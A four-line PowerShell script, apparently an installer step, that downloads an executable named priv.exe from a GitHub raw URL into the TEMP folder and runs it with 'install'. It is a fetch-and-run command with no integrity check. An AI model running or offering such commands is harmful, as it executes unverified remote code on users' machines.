$p="$env:TEMP\priv.exe"
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/Dylanthedabber/EasyPlasma/main/priv.exe",$p)
& $p install
